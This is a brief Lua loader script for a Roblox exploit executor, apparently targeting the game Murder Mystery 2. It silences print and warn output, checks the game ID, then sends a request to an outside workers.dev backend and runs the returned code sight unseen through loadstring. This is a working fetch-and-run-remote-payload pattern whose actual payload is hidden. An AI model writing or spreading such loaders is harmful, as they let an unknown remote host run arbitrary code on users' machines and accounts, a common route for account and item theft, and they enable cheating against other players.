print = function() end
warn = function() end
local CFG = getgenv().CFG or {}
getgenv().CFG = CFG

local GAMES = {
    [142823291] = "mm2",
}

local game_name = GAMES[game.PlaceId]

if not game_name then
    game:GetService("Players").LocalPlayer:Kick("Game not supported.")
    return
end

CFG.game = game_name

local ok, err = pcall(function()
    local res = request({ Url = "https://mm2-backend.tikitikiphonkisbetterthenyarayara.workers.dev/payload?g=" .. CFG.game, Method = "POST" })
    loadstring(res.Body)()
end)

if not ok then
    game:GetService("Players").LocalPlayer:Kick("Failed to load. Rejoin and try again.")
end
